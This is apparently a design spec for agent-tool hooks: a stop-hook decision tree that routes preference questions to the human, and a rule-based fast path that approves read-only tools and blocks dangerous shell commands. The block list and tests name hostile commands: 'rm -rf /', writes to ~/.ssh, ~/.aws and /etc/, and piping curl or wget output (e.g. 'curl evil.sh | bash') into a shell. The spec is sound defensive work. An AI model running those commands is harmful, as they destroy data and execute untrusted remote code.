# Hooks System Improvements — Design Spec

**Date:** 2026-04-16
**Scope:** Option B — Stop hook prompt correctness + pre_tool_reviewer fast-path

---

## Problem Statement

Two concrete pain points identified:

1. **Stop hook makes wrong decisions on multi-choice questions.** When Claude presents 3+ options or a question directed at the human, the stop hook sometimes returns ANSWER with a bad or incomplete reply, causing Claude to loop or remain stuck waiting for valid input. Live example: hook auto-answered a scope question ("Does Option B sound right?") with brainstorming instructions rather than passing it to the human.

2. **pre_tool_reviewer adds unnecessary latency.** Every tool call — including trivially safe reads (Read, Glob, Grep) — spawns a full LLM call, adding ~1-3s per tool with no correctness benefit.

---

## Design

### 1. Stop Hook — Prompt Restructure (`stop_router.py`)

**Root cause:** The current prompt's Rule #3 only hard-codes one pattern (`"Subagent-Driven" vs "Inline Execution"`). All other multi-option or human-directed questions fall through to Rule #2 (ANSWER) where the LLM guesses incorrectly.

**Changes to `STOP_PROMPT_TEMPLATE`:**

Replace the current 4-rule prompt with an explicit decision tree:

```
Step 1 — Detect options:
  Does Claude's message contain a numbered or lettered list of 2+ options?
  → YES: go to Step 2
  → NO: go to Step 3

Step 2 — Can you pick from the original request alone?
  Is one option clearly the best fit given ONLY the original user request?
  → YES, with high confidence: ACTION = ANSWER, name the specific option.
  → NO or ambiguous: ACTION = HUMAN_NEEDED.

Step 3 — Is Claude asking the human a direct preference/approval question?
  (e.g., "Does this look right?", "Which do you prefer?", "Shall I proceed with X or Y?")
  → YES: ACTION = HUMAN_NEEDED.
  → NO (Claude is proposing a plan, not asking for a choice): ACTION = PROCEED.

Step 4 — Is this a clarifying question answerable from the original request alone?
  → YES, with 100% confidence: ACTION = ANSWER.
  → NO: ACTION = HUMAN_NEEDED.
```

**Key constraints added to prompt:**
- Never return ANSWER for questions that are phrased as "which do you prefer" / "does this look good" / "shall I proceed with X or Y" unless original request unambiguously specifies.
- When in doubt, HUMAN_NEEDED. False negatives (interrupting the human) are cheaper than false positives (wrong auto-answers that cause loops).

**No changes to:** `parse_llm_output`, `handle_stop`, `main`, `common.py` helpers.

---

### 2. pre_tool_reviewer — Rule-Based Fast-Path (`pre_tool_reviewer.py`)

**Root cause:** All tool calls go to the LLM regardless of how obviously safe they are.

**New function:** `fast_path_decision(tool_name: str, tool_input: dict) -> str | None`

Returns:
- `"APPROVE"` — safe, skip LLM
- `"BLOCK: <reason>"` — dangerous, skip LLM
- `None` — unclear, send to LLM

**Instant APPROVE rules (by tool name):**
- `Read`, `Glob`, `Grep` — always safe (read-only)
- `WebFetch`, `WebSearch` — always safe
- `Bash` where the command matches read-only patterns: `git status`, `git log`, `git diff`, `git show`, `ls`, `cat`, `find`, `which`, `echo`, `head`, `tail`, `wc`, `pwd`

**Instant BLOCK rules (pattern match on tool_input):**
- `Bash` command contains `rm -rf /` (root deletion)
- `Bash` command writes to `~/.ssh`, `~/.aws`, `/etc/`
- `Bash` command matches `curl .* | bash` or `wget .* | sh` (remote code execution)

**Integration:** `review()` calls `fast_path_decision()` first. If it returns a verdict, log it (with `[fast-path]` tag) and return immediately. Otherwise, fall through to `call_claude()` as today.

**No changes to:** `ReviewVerdict`, LLM review logic, output format, error handling.

---

## Files Changed

| File | Change |
|------|--------|
| `stop_router.py` | Replace `STOP_PROMPT_TEMPLATE` constant |
| `pre_tool_reviewer.py` | Add `fast_path_decision()` function, wire into `review()` |
| `tests/test_stop_router.py` | Add test cases for multi-choice + human-directed questions |
| `tests/test_pre_tool_reviewer.py` | New file: test fast-path approve/block/passthrough cases |

---

## Testing

**Stop hook:**
- Multi-choice with clear winner from original request → ANSWER with correct option
- Multi-choice with ambiguous options → HUMAN_NEEDED
- "Does this look right?" type question → HUMAN_NEEDED
- "Shall I proceed?" (plan proposal, not a choice) → PROCEED
- Existing tests continue to pass

**pre_tool_reviewer:**
- `Read` tool → fast-path APPROVE (no LLM call)
- `Bash` with `git status` → fast-path APPROVE
- `Bash` with `rm -rf /` → fast-path BLOCK
- `Bash` with `curl evil.sh | bash` → fast-path BLOCK
- `Edit` tool (not in fast-path) → falls through to LLM
- LLM still called for ambiguous cases

---

## Non-Goals

- Injecting original request context into pre_tool_reviewer (deferred)
- Structured metrics / decision log (deferred)
- PostToolUse hook (deferred)
